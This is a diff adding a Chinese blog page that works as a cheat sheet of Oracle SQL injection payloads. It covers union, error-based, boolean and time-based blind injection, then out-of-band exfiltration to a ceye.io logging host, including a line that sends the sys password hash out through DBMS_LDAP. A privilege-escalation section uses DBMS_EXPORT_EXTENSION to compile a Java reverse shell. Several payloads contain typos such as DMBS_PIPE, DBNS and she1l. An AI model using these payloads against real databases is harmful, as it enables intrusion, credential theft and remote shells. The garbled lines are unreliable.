@@ -1,0 +1,471 @@
+<!doctype html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Oracle数据库注入 - ZXQ!!!</title><link rel="apple-touch-icon" href="/images/favicons/apple-touch-icon.png" sizes="180x180">
+<link rel="icon" href="/images/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+<link rel="icon" href="/images/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+<link rel="manifest" href="/images/favicons/manifest.json">
+<link rel="icon" href="/images/favicons/favicon.ico">
+<meta name="keywords" content="" />
+<meta name="description" content="" /><meta itemprop="name" content="Oracle数据库注入">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2023-04-20T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2023-04-20T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="2082">
+<meta itemprop="keywords" content="," /><meta property="og:title" content="Oracle数据库注入" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/tech/sql-3/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-04-20T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2023-04-20T00:00:00&#43;00:00" /><meta property="og:site_name" content="ZXQ!!!" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Oracle数据库注入"/>
+<meta name="twitter:description" content=""/>
+<meta data-name="palette" content="blue"><link rel=stylesheet href="/css/bundle.min.9819e4e2411e150748363de90ec254ddcda514cc29bb1238a532433adb77735b.css" integrity="sha256-mBnk4kEeFQdINj3pDsJU3c2lFMwpuxI4pTJDOtt3c1s=" crossorigin="anonymous"><script src="/js/bundle.min.e32615bc744413570374d5b28e8c02ec03c7b28c31485b6fcc5b6174a08766d9.js" integrity="sha256-4yYVvHREE1cDdNWyjowC7APHsowxSFtvzFthdKCHZtk=" crossorigin="anonymous"></script>
+<link href="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.css" rel="stylesheet">
+<script src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.js"></script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/contrib/auto-render.min.js"> </script>
+<script type="text/javascript">
+	document.addEventListener("DOMContentLoaded", function() {
+  renderMathInElement(document.body, {
+    delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false}
+    ],
+    macros: {
+      "\\ge": "\\geqslant",
+      "\\le": "\\leqslant",
+      "\\geq": "\\geqslant",
+      "\\leq": "\\leqslant"
+	}
+  });
+}); 
+</script>
+<meta property="og:type" content="index"/>
+<meta property="og:title" content="Unzybaryl`s Sekai" />
+<meta property="og:image" content="https://eustia.me/images/profile1.jpg" />
+<meta property="og:url" content="https://eustia.me/" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdn.jsdelivr.net/gh/flatblowfish/cave-draw/dist/cave-draw.min.js"></script></head><body><header><nav class="navbar navbar-expand-xl fixed-top">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      
+      ティアなのです！
+      
+    </a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav me-1 mb-2 mb-lg-0"><form class="search-bar d-flex ms-1" action="/search">
+  <div class="input-group input-group-sm">
+    <button class="btn btn-search disabled position-absolute left-0" type="submit"><i class="fas fa-fw fa-search"></i></button>
+    <input class="form-control rounded-pill" id="searchQuery" name="q" type="search" aria-label="Search">
+  </div>
+</form></ul><ul class="navbar-nav me-1 mb-2 mb-lg-0 me-1 ms-auto"><li class="nav-item">
+          <a class="nav-link" href="/archives">
+            <i class="fas fa-fw fa-file-archive"></i>归档
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="/bin/">
+            <i class="fas fa-fw fa-bookmark "></i>废案
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="/posts/tech/">
+            <i class="fas fa-fw fa-star"></i>技术
+          </a>
+        </li><li class="nav-item">
+  <a class="nav-link" data-bs-toggle="offcanvas" href="#offcanvasSettings" role="button"
+    aria-controls="offcanvasSettings">
+    <i class="fas fa-fw fa-sliders-h"></i> 设置
+  </a>
+</li>
+
+<div class="offcanvas offcanvas-end surface h-100" tabindex="-1" id="offcanvasSettings"
+  aria-labelledby="offcanvasSettingsLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" w id="offcanvasSettingsLabel"><i class="fas fa-fw fa-sliders-h"></i> 设置</h5>
+    <a role="button" data-bs-dismiss="offcanvas" aria-label="Close">
+      <span class="fas fa-2x fa-fw fa-times"></span>
+    </a>
+  </div>
+  <div class="offcanvas-body"><section class="setting">
+  <form class="row">
+    <div class="col-auto">
+      <label><i class="fas fa-fw fa-adjust"></i> 模式</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <div class="form-check form-switch">
+        <input class="form-check-input" type="checkbox" id="modeSwitcher">
+      </div>
+    </div>
+  </form>
+</section>
+<section class="setting">
+  <form class="font-size-switcher-form row">
+    <div class="col-auto">
+      <label for="fontSize" class="form-label"><i class="fas fa-fw fa-font"></i> 字体大小</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <input type="range" class="form-range" min="-2" max="2" id="fontSize">
+    </div>
+  </form>
+</section>
+
+</div>
+</div></ul>
+    </div>
+  </div>
+</nav>
+</header>
+<main role="main" class="container">
+      <div class="row content">
+<div class="col-lg-8">
+  <div class="container"><nav class="row" aria-label="breadcrumb">
+  <ol class="breadcrumb surface"><li class="breadcrumb-item"><a href="/">主页</a></li><li class="breadcrumb-item"><a href="/posts/">文章</a></li><li class="breadcrumb-item"><a href="/posts/tech/">Tech</a></li><li class="breadcrumb-item active">Oracle数据库注入</li></ol>
+</nav><article class="post row surface"><div class="post-panel-wrapper">
+  <div class="post-panel d-flex flex-column">
+    <a id="sidebarToggler" class="action d-none d-lg-block" role="button">
+  <i class="fas fa-fw fa-expand-alt fa-rotate-45"></i>
+</a>
+  
+    
+
+    
+    <a class="action" data-bs-container="body" data-bs-toggle="popover" data-bs-html="true" data-bs-placement="bottom"
+  data-bs-trigger="focus" tabindex="0"
+  data-bs-content="&lt;a target=&#34;_blank&#34; rel=&#34;license&#34; href=&#34;https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh&#34;&gt;CC BY-NC-ND 4.0 &lt;i class=&#34;fab fa-fw fa-creative-commons&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-by&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nc&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nd&#34;&gt;&lt;/i&gt;&lt;/a&gt;
+">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a id="btnTOC" class="fas fa-fw fa-list-alt" data-bs-toggle="offcanvas" href="#offcanvasTOC" aria-controls="offcanvasTOC" role="button">
+</a>
+  </div>
+</div>
+<h1 class="post-title my-3">Oracle数据库注入
+</h1><div class="post-meta mb-3">
+  <span class="post-date me-2">
+    <i class="fas fa-fw fa-calendar-alt"></i>2023-04-20
+  </span>
+  <span class="post-reading-time me-2">
+    <i class="fas fa-fw fa-coffee"></i>5 分钟阅读
+  </span>
+<a href="/categories/%E6%89%93%E6%80%AA%E5%8D%87%E7%BA%A7/" class="post-taxonomy">#打怪升级</a></div>
+
+
+
+                
+                <div class="addthis_inline_share_toolbox"></div>
+            <div class="offcanvas offcanvas-end surface" tabindex="-1" id="offcanvasTOC" aria-labelledby="offcanvasTOCLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" id="offcanvasTOCLabel">目录</h5>
+    <a role="button" data-bs-dismiss="offcanvas" aria-label="Close">
+      <span class="fas fa-2x fa-fw fa-times"></span>
+    </a>
+  </div>
+  <div class="offcanvas-body">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#oracle的特殊规则">Oracle的特殊规则</a></li>
+    <li><a href="#union回显注入">Union回显注入</a></li>
+    <li><a href="#报错注入">报错注入</a></li>
+    <li><a href="#布尔盲注">布尔盲注</a></li>
+    <li><a href="#时间盲注">时间盲注</a></li>
+    <li><a href="#外带通信">外带通信</a></li>
+    <li><a href="#oracle数据库提权">Oracle数据库提权</a>
+      <ul>
+        <li><a href="#执行java">执行JAVA</a></li>
+        <li><a href="#命令执行提升权限">命令执行提升权限</a></li>
+        <li><a href="#反弹shell">反弹shell</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div><div class="post-content mb-3" ><h2 id="oracle的特殊规则">Oracle的特殊规则</h2>
+<ol>
+<li>Oracle的查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual（dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面用于只有一条记录。</li>
+<li>Oracle的数据类型是强匹配的，在使用union查询时需要保证对应列上的数据类型一直。在无法猜出列数据类型的时候可以使用null代替。</li>
+<li>Oracle的单行注释符号是&ndash;，多行注释是/**/。</li>
+</ol>
+<h2 id="union回显注入">Union回显注入</h2>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="ln"> 1</span><span class="c1">--判断列数
+</span><span class="ln"> 2</span><span class="c1"></span><span class="s1">&#39; order by 3 --
+</span><span class="ln"> 3</span><span class="s1">
+</span><span class="ln"> 4</span><span class="s1">--判断回显位置
+</span><span class="ln"> 5</span><span class="s1">&#39;</span> <span class="k">union</span> <span class="k">select</span> <span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span> <span class="k">from</span> <span class="n">dual</span> <span class="c1">--
+</span><span class="ln"> 6</span><span class="c1"></span>
+<span class="ln"> 7</span><span class="c1">--获取版本信息
+</span><span class="ln"> 8</span><span class="c1"></span><span class="s1">&#39; union select null,(select banner from sys.v_$version where rownum=1),null from dual --
+</span><span class="ln"> 9</span><span class="s1">
+</span><span class="ln">10</span><span class="s1">--获取数据库表名
+</span><span class="ln">11</span><span class="s1">&#39;</span> <span class="k">union</span> <span class="k">select</span> <span class="k">null</span><span class="p">,(</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">user_tables</span> <span class="k">where</span> <span class="n">rownum</span><span class="o">=</span><span class="mi">1</span><span class="p">),</span><span class="k">null</span> <span class="k">from</span> <span class="n">dual</span> <span class="c1">--
+</span><span class="ln">12</span><span class="c1"></span><span class="s1">&#39; union select null,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#39;</span><span class="n">T_USER</span><span class="s1">&#39;),null
+</span><span class="ln">13</span><span class="s1">
+</span><span class="ln">14</span><span class="s1">--获取关键表中的列名
+</span><span class="ln">15</span><span class="s1">&#39;</span> <span class="k">union</span> <span class="k">select</span> <span class="k">null</span><span class="p">,(</span><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">user_tab_columns</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;T_USER&#39;</span> <span class="k">and</span> <span class="n">rownum</span><span class="o">=</span><span class="mi">1</span><span class="p">),</span><span class="k">null</span> <span class="k">from</span> <span class="n">dual</span> <span class="c1">--
+</span></code></pre></div><h2 id="报错注入">报错注入</h2>
+<p>核心在于参数类型不匹配+报错信息未处理。</p>
+<p>1.使用<code>utl_inaddr.get_host_name()</code>报错注入</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>id==1&#39; and 1=utl_inaddr.get_host_name((select user from dual))--
+</code></pre></div><p>2.使用<code>ctxsys.drithsx.sn()</code>报错注入</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>1&#39; and 1=ctxsys.drithsx.sn(1,(select user from dual))--
+</code></pre></div><p>3.使用<code>XMLType()</code>报错注入</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>1&#39; and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--
+</code></pre></div><p>4.使用<code>dbms_xdb_version.checkin()</code>报错注入</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>1&#39; and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null --
+</code></pre></div><p>5.使用<code>dbms_xdb_version.makeversioned()</code>报错注入</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>1&#39; and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null--
+</code></pre></div><p>6.使用<code>dbms_xdb_version.uncheckout()</code>报错注入</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>1&#39; and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null--
+<span class="ln">2</span>
+<span class="ln">3</span>1&#39; and (select dmbs_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null--
+</code></pre></div><p>7.使用<code>ordsus.ord_dicom.getmappingxpath</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>1&#39; and 1=ordsus.ord_dicom.getmappingxpath((select user from dual),user,user)--
+<span class="ln">2</span>
+<span class="ln">3</span>1&#39; and 1=ordsus.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user)--
+</code></pre></div><h2 id="布尔盲注">布尔盲注</h2>
+<p>1.使用decode函数：</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>1&#39;and 1=(select decode(substr(user,1,1),&#39;S&#39;,(1),0) from dual)--
+</code></pre></div><p><code>decode(substr(user,1,1),'S',(1),0)</code>中<code>substr(user,1,1)</code>是条件，S是值，如果相等返回1，不相等返回0。</p>
+<p><code>decode(条件，值1，翻译值1，值2，翻译值2，...，值n，翻译值n，缺省值)</code>条件等于值n，返回值n，都不等于返回缺省值。</p>
+<p>2:使用instr函数：</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>1&#39; and 1=(instr((select user from dual),&#39;SQL&#39;))
+</code></pre></div><p>instr返回&rsquo;SQL&rsquo;位置数据，查询结果中的位置，未找到返回0.如下面语句中返回结果4：</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>select instr(&#39;abcdefgh&#39;,;de) position from dual;
+</code></pre></div><h2 id="时间盲注">时间盲注</h2>
+<p>Oracle的时间盲注通常使用<code>DMBS_PIPE.RECEIVE_MESSAGE()</code>，这是在sqlmap源码中发现的；另外一种时间盲注是<code>decode()</code>与高耗时的SQL操作组合，也可以是case，if等方式与高耗时操作的组合。（高耗时操作指如<code>select ount(*) from all_objects</code>等对数据库中大量数据进行查询或其他处理的操作）</p>
+<p>1:使用DMBS_PIPE.RECEIVE_MESSAGE()</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="ln">1</span><span class="mi">1</span><span class="s1">&#39; and 1=(DMBS_PIPE.RECEIVE_MESSAGE(&#39;</span><span class="n">a</span><span class="s1">&#39;,10)) and &#39;</span><span class="mi">1</span><span class="s1">&#39;=1
+</span><span class="ln">2</span><span class="s1">
+</span><span class="ln">3</span><span class="s1">1&#39;</span> <span class="k">AND</span> <span class="mi">7238</span><span class="o">=</span><span class="p">(</span><span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span><span class="n">ASCII</span><span class="p">(</span><span class="n">SUBSTRC</span><span class="p">((</span><span class="k">SELECT</span> <span class="n">NVL</span><span class="p">(</span><span class="k">CASE</span><span class="p">(</span><span class="k">USER</span> <span class="k">AS</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">4000</span><span class="p">)),</span><span class="n">CHR</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span><span class="k">FROM</span> <span class="n">DUAL</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">96</span> <span class="k">THEN</span> <span class="n">DMBS_PIPE</span><span class="p">.</span><span class="n">RECEIVE_MESSAGE</span><span class="p">(</span><span class="n">CHR</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="o">||</span><span class="n">CHR</span><span class="p">(</span><span class="mi">106</span><span class="p">)</span><span class="o">||</span><span class="n">CHR</span><span class="p">(</span><span class="mi">72</span><span class="p">)</span><span class="o">||</span><span class="n">CHR</span><span class="p">(</span><span class="mi">73</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="k">ELSE</span> <span class="mi">7238</span> <span class="k">END</span><span class="p">)</span><span class="k">AND</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&amp;sname=1)
+</span></code></pre></div><p>2:使用decode()</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="ln">1</span><span class="o">#</span><span class="err">花费更多时间查询所有数据库的条目</span>
+<span class="ln">2</span><span class="p">(</span><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">from</span> <span class="n">all_objects</span><span class="p">)</span>
+<span class="ln">3</span>
+<span class="ln">4</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">sname</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and 1=(select decode(substr(user,1,1),&#39;</span><span class="n">S</span><span class="s1">&#39;,(select count(*) from all_objects),0)from dual) and &#39;</span><span class="mi">1</span><span class="s1">&#39; =&#39;</span><span class="mi">1</span>
+</code></pre></div><p>3:使用decode与DMBS_PIPE.RECEIVE_MESSAGE嵌套的方式</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="ln">1</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">sname</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and 1=(select decode(substr(user,1,1),&#39;</span><span class="n">A</span><span class="s1">&#39;,DMBS_PIPE.RECEIVE_MESSAGE(&#39;</span><span class="n">RDS</span><span class="s1">&#39;,5),0)from dual) and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+</code></pre></div><h2 id="外带通信">外带通信</h2>
+<p>Oracle可以发送http和dns请求，并且可以将查询结果带到请求中。利用<code>utl_http.request()</code>发送http请求，同时也可以ssrf。利用<code>utl_inaddr.get_host_address()</code>将查询结果拼接到域名。</p>
+<p>下面是ceye提供的payload（这网站目前已经挂了）</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="ln">1</span><span class="k">select</span> <span class="n">UTL_INADDR</span><span class="p">.</span><span class="n">GET_HOST_ADDRESS</span><span class="p">(</span><span class="s1">&#39;ip.port.b182oj.ceye.io&#39;</span><span class="p">);</span>
+<span class="ln">2</span><span class="k">select</span> <span class="n">UTL_HTTP</span><span class="p">.</span><span class="n">REQUEST</span><span class="p">(</span><span class="s1">&#39;http://ip.port.b182oj.ceye.io/oracle&#39;</span><span class="p">)</span> <span class="k">from</span>  <span class="n">dual</span><span class="p">;</span>
+<span class="ln">3</span><span class="k">select</span> <span class="n">HTTPUR</span><span class="p">(</span><span class="s1">&#39;http://ip.port.b182oj.ceye.io/oracle&#39;</span><span class="p">).</span><span class="n">GETCLOB</span><span class="p">()</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
+<span class="ln">4</span><span class="k">select</span> <span class="n">DBMS_LDAP</span><span class="p">.</span><span class="n">INIT</span><span class="p">(</span><span class="s1">&#39;oracle.ip.port.b182oj.ceye.io&#39;</span><span class="p">,</span><span class="mi">80</span><span class="p">)</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
+<span class="ln">5</span><span class="k">select</span> <span class="n">DBMS_LDAP</span><span class="p">.</span><span class="n">INIT</span><span class="p">((</span><span class="k">select</span> <span class="n">password</span> <span class="k">from</span> <span class="n">sys</span><span class="p">.</span><span class="k">user</span><span class="err">$</span> <span class="k">where</span> <span class="n">name</span><span class="o">=</span><span class="s1">&#39;sys&#39;</span><span class="p">)</span><span class="o">||</span><span class="s1">&#39;.ip.port.b182oj.ceye.io&#39;</span><span class="p">,</span><span class="mi">80</span><span class="p">)</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
+</code></pre></div><h2 id="oracle数据库提权">Oracle数据库提权</h2>
+<p>Oracle存在提权漏洞的一个重要原因是PLSQL定义的两种调用权限（定义者权限，调用者权限）。无论调用者权限如何，执行存储过程的结果权限永远是定义者权限。如果一个高权限用户定义存储过程，并赋予低权限用户调用权限，低用户可以利用这个存储过程。</p>
+<h3 id="执行java">执行JAVA</h3>
+<p><a href="http://drops.xmd5.com/static/drops/tips-57.html">http://drops.xmd5.com/static/drops/tips-57.html</a></p>
+<p>DBMS_EXPORT_EXTENSION()</p>
+<ol>
+<li>创建JAVA库</li>
+<li>赋予JAVA权限</li>
+<li>创建函数</li>
+<li>赋予函数执行权限</li>
+<li>执行</li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="ln"> 1</span><span class="mi">1</span><span class="p">.</span><span class="err">创建</span><span class="n">java代码</span>
+<span class="ln"> 2</span><span class="k">select</span> <span class="n">SYS</span><span class="p">.</span><span class="n">DBNS_EXPORT_EXTENSION</span><span class="p">.</span><span class="n">GET_DONAIN_INDEX_TABLES</span><span class="p">(</span><span class="s1">&#39;FOO&#39;</span><span class="p">,</span><span class="s1">&#39;BAR&#39;</span><span class="p">,</span><span class="s1">&#39;DNS_OUTPUT&#34;.PUT(:P1);EXECUTEIMMEDIATE &#39;&#39;DECLARE PRAGWA AUTONONOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &#34;shell&#34; as import java.io.*;import java.net. *;public class shell {public static void run() throws Exception{String[] aaa={&#34;/bin/bash&#34;,&#34;-c&#34;, &#34;exec 9&lt;&gt; /dev/
+</span><span class="ln"> 3</span><span class="s1">tcp/127.0.0.1/8080;exec 0&gt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh&#34;};Process p=Runtime.getRuntime().exec(aaa);}&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;</span><span class="p">,</span><span class="s1">&#39;SYS&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="k">from</span> <span class="n">dual</span>
+<span class="ln"> 4</span>
+<span class="ln"> 5</span><span class="mi">2</span><span class="p">.</span><span class="err">赋予</span><span class="n">java权限</span>
+<span class="ln"> 6</span><span class="k">select</span> <span class="n">SYS</span><span class="p">.</span><span class="n">DBMS_EXPORT_EXTENSION</span><span class="p">.</span><span class="n">GET_DOMAIN_</span> <span class="n">INDEX_TABLES</span><span class="p">(</span><span class="s1">&#39;FOO&#39;</span><span class="p">,</span><span class="s1">&#39;BAR&#39;</span><span class="p">,</span><span class="s1">&#39;DENS_OUTPUT&#34;.PUT(:P1);EXECUTEIMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONONOUS_TRANSACTION;BEGIN EXECUTE INMEDIATE&#39;&#39;&#39;&#39;begin
+</span><span class="ln"> 7</span><span class="s1">dbms_java.grant_permission(&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;&#39;&#39;&#39;</span><span class="n">SYS</span><span class="p">:</span><span class="n">java</span><span class="p">.</span><span class="n">net</span><span class="p">.</span><span class="n">SocketPermission</span><span class="s1">&#39;&#39;&#39;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;&#39;&#39;&#39;</span><span class="o">&lt;&gt;</span><span class="s1">&#39;&#39;&#39;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;&#39;&#39;&#39;</span><span class="o">*</span><span class="s1">&#39;&#39;&#39;&#39;&#39;&#39;&#39;);end:&#39;&#39;&#39;&#39;:END:&#39;&#39;:END;--&#39;</span><span class="p">,</span><span class="s1">&#39;SYS&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="k">from</span> <span class="n">dual</span>
+<span class="ln"> 8</span>
+<span class="ln"> 9</span><span class="mi">3</span><span class="p">.</span><span class="err">创建函数</span>
+<span class="ln">10</span><span class="k">select</span> <span class="n">sYs</span><span class="p">.</span><span class="n">DBNS_EXPORT_EXTENSION</span><span class="p">.</span><span class="n">GET_DOWAIN_INDEX_TABLES</span><span class="p">(</span><span class="s1">&#39;FOO&#39;</span> <span class="p">,</span><span class="s1">&#39;BAR&#39;</span><span class="p">,</span><span class="s1">&#39;DBMS_OUTPUT&#39;</span><span class="p">.</span><span class="n">PUT</span><span class="p">(:</span><span class="n">P1</span><span class="p">);</span><span class="n">EXECUTEIMMEDIATE</span> <span class="s1">&#39;&#39;</span><span class="k">DECLARE</span> <span class="n">PRAGMA</span> <span class="n">AUTONOMOUS_TRANSACTION</span><span class="p">;</span><span class="k">BEGIN</span> <span class="k">EXECUTE</span> <span class="k">IMMEDIATE</span> <span class="s1">&#39;&#39;&#39;&#39;</span><span class="k">create</span> <span class="k">or</span> <span class="k">replace</span>
+<span class="ln">11</span><span class="k">function</span> <span class="n">reversetcp</span> <span class="k">RETURN</span> <span class="n">VARCHAR2</span> <span class="k">as</span> <span class="k">language</span> <span class="n">java</span> <span class="n">name</span><span class="s1">&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;</span><span class="n">she1l</span><span class="p">.</span><span class="n">run</span><span class="p">()</span> <span class="k">return</span> <span class="n">String</span><span class="s1">&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;</span><span class="p">;</span>
+<span class="ln">12</span><span class="s1">&#39;&#39;&#39;&#39;</span><span class="p">;</span><span class="k">END</span><span class="p">;</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">END</span><span class="p">;</span><span class="c1">--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0)from dual
+</span><span class="ln">13</span><span class="c1"></span>
+<span class="ln">14</span><span class="mi">4</span><span class="p">.</span><span class="err">赋予函数执行权限</span>
+<span class="ln">15</span><span class="k">select</span> <span class="n">SYS</span><span class="p">.</span><span class="n">DBMS_EXPORT_EXTENSTON</span><span class="p">.</span><span class="n">GET_DOMAIN_INDEX_TABLES</span><span class="p">(</span><span class="s1">&#39;FOO&#39;</span><span class="p">,</span><span class="s1">&#39;BAR&#39;</span><span class="p">,</span><span class="s1">&#39;DBMS_OUTPUT&#34;.PUT(:P1);EXECUTEINVEDIATE &#34;&#39;</span><span class="k">DECLARE</span> <span class="n">PRAGMA</span> <span class="n">AUTONONOUs_TRANSACTION</span><span class="p">;</span><span class="k">BEGIN</span> <span class="k">EXECUTE</span> <span class="k">IMMEDIATE</span> <span class="s1">&#39;&#39;&#39;&#39;</span><span class="k">grant</span> <span class="k">all</span> <span class="k">on</span> <span class="n">reversetcp</span> <span class="k">to</span> <span class="k">public</span><span class="s1">&#39;&#39;&#39;&#39;</span><span class="p">;</span><span class="k">END</span><span class="p">;</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">END</span><span class="p">;</span><span class="c1">--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0)from dual
+</span><span class="ln">16</span><span class="c1"></span>                                                         
+<span class="ln">17</span><span class="mi">5</span><span class="p">.</span><span class="err">反弹</span><span class="n">shell</span>
+<span class="ln">18</span><span class="k">select</span> <span class="n">sys</span><span class="p">.</span><span class="n">reversetcp</span> <span class="k">from</span> <span class="n">dual</span>
+<span class="ln">19</span>
+<span class="ln">20</span>
+</code></pre></div><h3 id="命令执行提升权限">命令执行提升权限</h3>
+<p>1.DBMS_EXPORT_EXTENSION()</p>
+<p>DBMS_EXPORT_EXTENSION是一个输出扩展功能包。其实存在三个危险函数，<code>get_domain_index_metadata</code>,<code>get_v2_domain_index_tables</code>,<code>get_domain_index_tables</code>。都是以sys权限定义，默认低权限用户可以调用。</p>
+<p>2.dbms_xmlquery.newcontext()</p>
+<p>需要DBMS_EXPORT_EXTENSION()才能成功。当DBMS_EXPORT_EXTENSION()漏洞修复时将无法使用这个函数提权。</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>select LinxRinCMD(&#39;id&#39;) from dual
+</code></pre></div><p>3.DBMS_JAVA_TEST.FUNCALL()</p>
+<p>影响版本：10gR2,11gR1,11gR2。需要java代码执行权限。</p>
